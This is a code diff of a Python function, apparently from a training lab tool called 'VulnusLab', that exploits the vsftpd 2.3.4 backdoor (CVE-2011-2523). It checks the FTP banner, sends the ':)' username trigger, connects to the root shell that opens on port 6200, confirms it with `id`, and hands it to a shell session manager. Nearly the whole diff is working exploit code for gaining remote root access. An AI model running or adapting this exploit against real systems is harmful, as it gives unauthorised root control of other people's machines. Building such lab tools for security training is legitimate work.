@@ -4199,45 +4199,101 @@ def _xpl_port_open(host: str, port: int, timeout: float = 3.0) -> bool:
 async def exploit_vsftpd_234(target: str, sid: str) -> dict:
     """CVE-2011-2523 — vsftpd 2.3.4 smile-username backdoor. A USER value
     containing ':)' makes the daemon spawn a passwordless root shell on
-    port 6200. We send the magic FTP login, wait for 6200 to bind, then
-    hand the new shell to the session manager."""
-    # Step 1 — fire the trigger over a fresh FTP control connection
+    port 6200. We do four things, in order:
+
+      1. Banner grab port 21 to verify vsftpd 2.3.4 is really there
+      2. Fire the smile-trigger over an FTP control channel
+      3. Connect to the backdoor on port 6200
+      4. Send `id` and wait for `uid=` so the shell is actually proven live
+         before we hand it to the user."""
+    # Step 1 — banner check
     try:
-        reader, writer = await asyncio.open_connection(target, 21)
+        reader_b, writer_b = await asyncio.open_connection(target, 21)
+        banner = b""
         try:
-            await asyncio.wait_for(reader.read(512), timeout=3)
-            writer.write(b"USER vulnuslab:)\r\n")
-            await writer.drain()
-            await asyncio.sleep(0.5)
-            try: await asyncio.wait_for(reader.read(512), timeout=2)
+            banner = await asyncio.wait_for(reader_b.read(512), timeout=3)
+        except Exception: pass
+        banner_str = banner.decode("utf-8", errors="replace").strip()
+        if "2.3.4" not in banner_str:
+            try: writer_b.close()
             except Exception: pass
-            writer.write(b"PASS anything\r\n")
-            await writer.drain()
-            await asyncio.sleep(4)
+            return {"ok": False,
+                    "error": f"Target is not vsftpd 2.3.4 (got banner: '{banner_str[:120]}'). The backdoor only exists in that exact version.",
+                    "cve": "CVE-2011-2523"}
+        # Step 2 — fire the smile-trigger on the SAME control connection
+        try:
+            writer_b.write(b"USER vulnuslab:)\r\n")
+            await writer_b.drain()
+            try: await asyncio.wait_for(reader_b.read(512), timeout=2)
+            except Exception: pass
+            writer_b.write(b"PASS anything\r\n")
+            await writer_b.drain()
+            # The daemon never replies to PASS — it forks /bin/sh on 6200 instead
+            await asyncio.sleep(2)
+        except Exception as e:
+            return {"ok": False, "error": f"FTP trigger failed mid-handshake: {e}",
+                    "cve": "CVE-2011-2523"}
         finally:
-            try: writer.close()
+            try: writer_b.close()
             except Exception: pass
     except Exception as e:
-        return {"ok": False, "error": f"FTP trigger failed: {e}", "cve": "CVE-2011-2523"}
-
-    # Step 2 — wait for port 6200 to open (up to 8 sec)
-    backdoor_port = 6200
-    for _ in range(16):
-        if _xpl_port_open(target, backdoor_port, timeout=1):
-            break
-        await asyncio.sleep(0.5)
-    else:
-        return {"ok": False, "error": "Backdoor did not spawn on port 6200. "
-                                       "vsftpd may be patched or already triggered this session.",
+        return {"ok": False, "error": f"Could not reach FTP on port 21: {e}",
                 "cve": "CVE-2011-2523"}
 
-    # Step 3 — open the shell session
-    shell = await _xpl_open_shell(sid, target, backdoor_port,
-                                   "vsftpd_234_backdoor")
-    return {"ok": shell.status == "live",
+    # Step 3 — wait for port 6200 to bind (up to 10 sec)
+    backdoor_port = 6200
+    bound = False
+    for _ in range(20):
+        if _xpl_port_open(target, backdoor_port, timeout=1):
+            bound = True; break
+        await asyncio.sleep(0.5)
+    if not bound:
+        return {"ok": False,
+                "error": "Smile-trigger sent but port 6200 never bound. The backdoor may have already been triggered this session — restart with: docker restart lab_metasploitable",
+                "cve": "CVE-2011-2523"}
+
+    # Step 4 — connect to the backdoor shell
+    try:
+        reader, writer = await asyncio.open_connection(target, backdoor_port)
+    except Exception as e:
+        return {"ok": False, "error": f"Port 6200 is open but connection refused: {e}",
+                "cve": "CVE-2011-2523"}
+
+    # Step 5 — VERIFY the shell is alive (send `id`, expect `uid=`)
+    try:
+        writer.write(b"id\n"); await writer.drain()
+        verify = await asyncio.wait_for(reader.read(1024), timeout=4)
+        verify_str = verify.decode("utf-8", errors="replace")
+        if "uid=" not in verify_str:
+            try: writer.close()
+            except Exception: pass
+            return {"ok": False,
+                    "error": f"Port 6200 connected but no /bin/sh on the other end. Got: '{verify_str[:200]}'. Restart metasploitable: docker restart lab_metasploitable",
+                    "cve": "CVE-2011-2523"}
+    except asyncio.TimeoutError:
+        try: writer.close()
+        except Exception: pass
+        return {"ok": False,
+                "error": "Connected to port 6200 but shell did not respond to `id` within 4 seconds. The container may be running a stub vsftpd without the real backdoor. Restart it: docker restart lab_metasploitable",
+                "cve": "CVE-2011-2523"}
+
+    # Step 6 — shell is proven live; hand it to the session manager
+    shell = ExploitShell(sid, target, backdoor_port, "vsftpd_234_backdoor")
+    shell.reader = reader; shell.writer = writer; shell.status = "live"
+    shell.append("=== VulnusLab — vsftpd 2.3.4 backdoor shell ===\n")
+    shell.append(verify_str)
+    EXPLOIT_SHELLS[sid] = shell
+    asyncio.create_task(_xpl_pipe_reader(reader, shell))
+    # Best-effort follow-up probes for nicer initial output
+    for c in ["uname -a", "hostname", "pwd"]:
+        try:
+            writer.write((c + "\n").encode()); await writer.drain()
+        except Exception: break
+
+    return {"ok": True,
             "shell_id": sid,
             "cve": "CVE-2011-2523",
-            "evidence": f"FTP USER `vulnuslab:)` triggered backdoor — root shell bound to {target}:6200.",
+            "evidence": f"vsftpd 2.3.4 backdoor verified — first `id` output: {verify_str.strip()[:120]}",
             "shell_target": target,
             "shell_port": backdoor_port}
 
